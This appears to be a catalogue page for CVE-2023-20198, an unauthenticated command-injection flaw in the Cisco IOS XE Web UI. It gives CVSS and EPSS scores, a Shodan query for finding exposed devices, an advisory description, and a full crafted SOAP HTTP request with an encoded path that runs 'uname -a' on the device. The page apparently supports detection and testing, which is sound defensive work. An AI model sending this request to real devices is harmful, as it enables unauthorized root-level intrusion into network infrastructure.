_cves/cve-2023-20198.md

---
layout: "post"
cve_id: "CVE-2023-20198"
title: "Cisco IOS XE Web UI - Command Injection"
pcap: true
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-20198.yaml"
author: "iamnoooob,rootxharsh,pdresearch,nullenc0de"
severity: "critical"
reference: ['https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z', 'https://www.rapid7.com/blog/post/2023/10/16/etr-cisco-ios-xe-web-ui-cve-2023-20198-active-exploitation/']
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  cvss-score: "9.8"
  cve-id: "CVE-2023-20198"
  epss-score: "0.93977"
  epss-percentile: "0.99878"
metadata:
  max-request: "1"
  verified: "True"
  vendor: "cisco"
  product: "ios_xe"
  shodan-query: "http.html_hash:1076109428"
tags: ['cve', 'cve2023', 'cisco', 'rce', 'router', 'iot', 'network', 'kev', 'vkev', 'vuln']
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## 🔍 Vulnerability Description
A vulnerability in the web UI component of Cisco IOS XE Software could allow an unauthenticated, remote attacker to execute arbitrary commands with root privileges on the underlying operating system. This vulnerability is due to improper input validation in the web UI. An attacker could exploit this vulnerability by sending crafted HTTP requests to an affected device. A successful exploit could allow the attacker to execute arbitrary commands with root privileges on the underlying operating system.


## 🌐 HTTP Request
<pre style="background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto;">
POST /%77eb%75i_%77sma_Http HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)
Content-Length: 720
Connection: close
Content-Type: text/xml; charset=UTF-8
Accept-Encoding: gzip

<?xml version="1.0"?> <SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> <SOAP:Header> <wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext"> <wsse:UsernameToken SOAP:mustUnderstand="false"> <wsse:Username>admin</wsse:Username><wsse:Password>*****</wsse:Password></wsse:UsernameToken></wsse:Security></SOAP:Header><SOAP:Body><request correlator="exec1" xmlns="urn:cisco:wsma-exec"> <execCLI xsd="false"><cmd>uname -a</cmd><dialogue><expect></expect><reply></reply></dialogue></execCLI></request></SOAP:Body></SOAP:Envelope>
</pre>
